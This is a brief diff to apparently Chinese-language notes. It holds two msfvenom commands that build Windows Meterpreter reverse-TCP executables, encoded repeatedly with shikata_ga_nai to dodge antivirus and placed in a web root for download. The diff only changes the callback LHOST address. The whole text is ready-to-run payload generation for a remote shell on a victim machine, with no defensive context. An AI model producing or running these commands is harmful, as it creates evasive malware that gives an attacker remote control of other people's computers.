@@ -1,9 +1,9 @@
 编译一次：
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.107 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/1.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.92  lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/1.exe
 
 
 编译两次：
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.107 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/2.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.92 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/2.exe
 
 
 
